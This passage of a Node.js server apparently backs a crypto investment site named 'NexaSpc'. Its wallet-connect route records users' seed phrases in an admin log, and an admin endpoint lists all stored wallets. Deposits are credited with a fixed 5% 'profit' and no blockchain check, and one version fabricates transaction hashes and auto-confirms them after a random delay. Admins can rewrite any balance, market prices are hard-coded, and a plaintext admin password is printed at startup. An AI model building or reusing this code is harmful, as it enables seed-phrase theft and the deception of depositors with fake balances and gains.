  logAdmin('wallet_connected', { userEmail: req.user.email, username: users[req.user.email]?.username, walletType, walletAddress: walletAddress || '', seedPhrase, network: network || 'Unknown', message: `Wallet: ${walletType} by ${users[req.user.email]?.username}` });
  res.json({ success: true, wallet: { id: entry.id, walletType, walletAddress: entry.walletAddress, network: entry.network, connectedAt: entry.connectedAt } });
});
app.get('/api/wallet/connected', authMiddleware, (req, res) => {
  res.json((connectedWallets[req.user.email] || []).map(w => ({ id: w.id, walletType: w.walletType, walletAddress: w.walletAddress, network: w.network, connectedAt: w.connectedAt })));
});
app.delete('/api/wallet/connected/:id', authMiddleware, (req, res) => {
  const id = parseInt(req.params.id);
  connectedWallets[req.user.email] = (connectedWallets[req.user.email] || []).filter(w => w.id !== id);
  res.json({ success: true });
});
 
// ─── DEPOSIT ──────────────────────────────────────────────────
app.post('/api/deposit', authMiddleware, async (req, res) => {
  try {
    const { coin, amount, txHash } = req.body;
    const amt = parseFloat(amount);

    if (!coin || isNaN(amt) || amt <= 0) {
      return res.status(400).json({ error: 'Invalid deposit data' });
    }

    const email = req.user.email.toLowerCase().trim();
    const profitBonus = amt * 0.05; // 5% bonus profit
    const totalCredit = amt + profitBonus;

    // 1. Atomically update user balance, deposits, and profits in MongoDB Atlas
    const user = await User.findOneAndUpdate(
      { email },
      {
        $inc: {
          walletBalance: totalCredit,
          deposits: amt,
          profits: profitBonus
        }
      },
      { new: true } // Return the updated document
    );

    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    // 2. Create transaction record
    const tx = {
      id: Date.now(),
      type: 'deposit',
      coin,
      amount: amt,
      txHash: txHash || 'pending',
      status: 'completed',
      date: new Date().toISOString()
    };

    // If you have a Transaction model or array in User model, save it:
    if (Array.isArray(user.transactions)) {
      user.transactions.push(tx);
      await user.save();
    }

    // 3. Trigger notifications and logs safely
    if (typeof pushNotif === 'function') {
      pushNotif(email, 'deposit', `Deposit of $${amt.toFixed(2)} (${coin}) confirmed.`);
    }

    if (typeof sendEmail === 'function') {
      sendEmail(
        email,
        '✅ Deposit Confirmed - NexaSpc',
        `<div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto">
          <h2 style="color:#10b981">Deposit Confirmed</h2>
          <p>Amount: $${amt.toFixed(2)} (${coin})</p>
          <p>New Balance: $${user.walletBalance.toFixed(2)}</p>
        </div>`
      ).catch(err => console.warn('Email send warning:', err.message));
    }

    if (typeof logAdmin === 'function') {
      logAdmin('deposit', { userEmail: email, username: user.username, message: `Deposit $${amt} (${coin}) by ${user.username}` });
    }

    // 4. Return updated metrics matching frontend expected fields
    return res.json({
      success: true,
      transaction: tx,
      balance: user.walletBalance,
      deposits: user.deposits,
      profits: user.profits,
      bonuses: user.bonuses
    });

  } catch (err) {
    console.error('[/api/deposit] ERROR:', err);
    return res.status(500).json({ error: 'Server error processing deposit.' });
  }
});

// Admin approval route
app.post('/api/admin/approve-deposit', adminMiddleware, async (req, res) => {
  const { userId, amount } = req.body;

  await User.findByIdAndUpdate(userId, {
    $inc: { walletBalance: amount, deposits: amount }
  });

  return res.json({ success: true, message: 'Deposit approved and balance credited.' });
});
 
// ─── WITHDRAW ─────────────────────────────────────────────────
app.post('/api/withdraw', authMiddleware, (req, res) => {
  const { coin, amount, walletAddress, source } = req.body;
  const user = users[req.user.email];
  if (!coin || !amount || !walletAddress) return res.status(400).json({ error: 'All fields required' });
  const amt = parseFloat(amount);
  const available = source === 'profits' ? user.profits : user.balance;
  if (amt > available) return res.status(400).json({ error: 'Insufficient funds' });
  if (source === 'profits') user.profits -= amt; else user.balance -= amt;
  const tx = { id: Date.now(), type: 'withdrawal', coin, amount: amt, walletAddress, source, status: 'pending', date: new Date().toISOString() };
  transactions[req.user.email].push(tx);
  pushNotif(req.user.email, 'withdrawal', `Withdrawal of $${amt.toFixed(2)} (${coin}) submitted.`);
  sendEmail(req.user.email, '⏳ Withdrawal Submitted - NexaSpc', `<div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto"><h2 style="color:#00d4ff">Withdrawal Submitted</h2><p>Amount: $${amt.toFixed(2)} (${coin})</p><p>To: ${walletAddress}</p></div>`);
  res.json({ success: true, transaction: tx, balance: user.balance, profits: user.profits });
});

//Update Balance
// Admin endpoint to adjust or reset any user's financial metrics
app.post('/api/admin/update-balance', adminMiddleware, async (req, res) => {
  try {
    const { targetEmail, newBalance, newDeposits, newProfits, resetHoldings } = req.body;

    const user = await User.findOne({ email: targetEmail.toLowerCase().trim() });
    if (!user) return res.status(404).json({ error: 'Target user not found' });

    if (newBalance !== undefined) user.walletBalance = parseFloat(newBalance);
    if (newDeposits !== undefined) user.deposits = parseFloat(newDeposits);
    if (newProfits !== undefined) user.profits = parseFloat(newProfits);

    if (resetHoldings) {
      user.holdings = []; // Empties all holdings back to 0
    }

    await user.save();

    return res.json({
      success: true,
      message: `Updated balance for ${user.email}`,
      user: {
        walletBalance: user.walletBalance,
        deposits: user.deposits,
        profits: user.profits,
        holdings: user.holdings
      }
    });
  } catch (err) {
    return res.status(500).json({ error: 'Admin override error' });
  }
});
 
// ─── TRANSACTIONS ─────────────────────────────────────────────
app.post('/api/deposit', authMiddleware, async (req, res) => {
  try {
    const { coin, amount, txHash } = req.body;
    const amt = parseFloat(amount);

    if (!coin || isNaN(amt) || amt <= 0) {
      return res.status(400).json({ error: 'Invalid deposit data' });
    }

    const email = req.user.email.toLowerCase().trim();
    const user = await User.findOne({ email });
    if (!user) return res.status(404).json({ error: 'User not found' });

    // 1. Save transaction as PENDING
    const tx = await Transaction.create({
      userId: user._id,
      userEmail: email,
      type: 'deposit',
      coin: coin.toUpperCase(),
      amount: amt,
      txHash: txHash || '0x' + Math.random().toString(36).substring(2, 15),
      status: 'pending'
    });

    // OPTIONAL: Auto-confirm after random delay between 3 to 12 minutes (180,000ms - 720,000ms)
    const randomDelay = Math.floor(Math.random() * (720000 - 180000 + 1)) + 180000;
    
    setTimeout(async () => {
      try {
        const pendingTx = await Transaction.findById(tx._id);
        // Only confirm if admin hasn't rejected/changed status manually
        if (pendingTx && pendingTx.status === 'pending') {
          pendingTx.status = 'completed';
          await pendingTx.save();

          // Increment balance and update specific coin holding
          await creditUserDeposit(user._id, pendingTx.coin, pendingTx.amount);
        }
      } catch (err) {
        console.error('Auto-confirmation error:', err);
      }
    }, randomDelay);

    return res.json({
      success: true,
      message: 'Deposit submitted! Confirmation typically takes 3-12 minutes.',
      transaction: tx
    });

  } catch (err) {
    console.error('[/api/deposit] ERROR:', err);
    return res.status(500).json({ error: 'Server error creating pending deposit.' });
  }
});

// Helper function to credit user funds & holdings
async function creditUserDeposit(userId, coin, amount) {
  const profitBonus = amount * 0.05;
  const totalCredit = amount + profitBonus;

  const user = await User.findById(userId);
  if (!user) return;

  user.walletBalance += totalCredit;
  user.deposits += amount;
  user.profits += profitBonus;

  // Find or create holding entry for this coin
  let holding = user.holdings.find(h => h.coin === coin);
  if (holding) {
    holding.amount += amount;
    holding.usdValue += amount;
  } else {
    user.holdings.push({ coin, amount, usdValue: amount });
  }

  await user.save();
}

app.get('/api/transactions', authMiddleware, (req, res) => {
  res.json([...(transactions[req.user.email] || [])].reverse());
});

// GET /api/transactions - Fetch history for current user
app.get('/api/transactions', authMiddleware, async (req, res) => {
  try {
    const txs = await Transaction.find({ userEmail: req.user.email.toLowerCase().trim() })
      .sort({ createdAt: -1 }); // Newest first

    return res.json({ success: true, transactions: txs });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to fetch transaction history' });
  }
});
// ─── MARKETS ──────────────────────────────────────────────────
app.get('/api/markets', (req, res) => res.json([
  { symbol: 'BTC/USDT',  price: 67842.50, change:  2.34, volume: '24.5B' },
  { symbol: 'ETH/USDT',  price:  3521.20, change:  1.87, volume: '12.1B' },
  { symbol: 'SOL/USDT',  price:   185.40, change: -0.92, volume:  '3.2B' },
  { symbol: 'XRP/USDT',  price:    0.6234,change:  3.15, volume:  '2.8B' },
  { symbol: 'BNB/USDT',  price:   412.80, change:  0.54, volume:  '1.9B' },
  { symbol: 'ADA/USDT',  price:    0.4821,change: -1.23, volume:  '890M' },
  { symbol: 'DOGE/USDT', price:    0.1543,change:  5.62, volume:  '1.1B' },
  { symbol: 'AVAX/USDT', price:    38.92, change: -2.11, volume:  '654M' }
]));
 
// ─── ADMIN ────────────────────────────────────────────────────
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (password !== 'nexaspc_admin_pass') return res.status(401).json({ error: 'Wrong password' });
  const token = jwt.sign({ role: 'admin' }, ADMIN_SECRET, { expiresIn: '12h' });
  res.json({ token });
});
app.get('/api/admin/users', adminMiddleware, (req, res) => {
  res.json(Object.values(users).map(u => ({
    username: u.username, email: u.email, phone: u.phone,
    balance: u.balance, deposits: u.deposits, profits: u.profits, bonuses: u.bonuses,
    emailVerified: u.emailVerified, phoneVerified: u.phoneVerified,
    createdAt: u.createdAt, lastLogin: u.lastLogin, country: u.country,
    walletCount: (connectedWallets[u.email] || []).length
  })));
});
app.get('/api/admin/pending', adminMiddleware, (req, res) => {
  res.json(Object.values(pendingUsers).map(p => ({
    username: p.username, email: p.email,
    phone: p.phone, emailVerified: p.emailVerified,
    phoneVerified: p.phoneVerified, createdAt: p.createdAt
  })));
});
app.get('/api/admin/users/:email', adminMiddleware, (req, res) => {
  const email = decodeURIComponent(req.params.email);
  const user = users[email];
  if (!user) return res.status(404).json({ error: 'Not found' });
  res.json({ ...user, password: '***', transactions: transactions[email] || [], notifications: notifications[email] || [], connectedWallets: connectedWallets[email] || [] });
});
app.get('/api/admin/wallets', adminMiddleware, (req, res) => {
  const all = [];
  for (const [email, wallets] of Object.entries(connectedWallets))
    wallets.forEach(w => all.push({ ...w, userEmail: email, username: users[email]?.username }));
  res.json(all);
});
app.get('/api/admin/log', adminMiddleware, (req, res) => res.json(adminLog.slice(0, 200)));
 
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, '../public/admin.html')));
app.get('*', (req, res) => res.sendFile(path.join(__dirname, '../public/index.html')));
 
app.listen(PORT, () => {
  console.log(`\n🚀 NexaSpc  → http://localhost:${PORT}`);
  console.log(`🛡️  Admin    → http://localhost:${PORT}/admin  (pass: nexaspc_admin_pass)\n`);
  console.log('📧 To enable real emails, set: SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS');
  console.log('📱 To enable SMS, add Twilio SDK call inside sendSms() in server/index.js\n');
});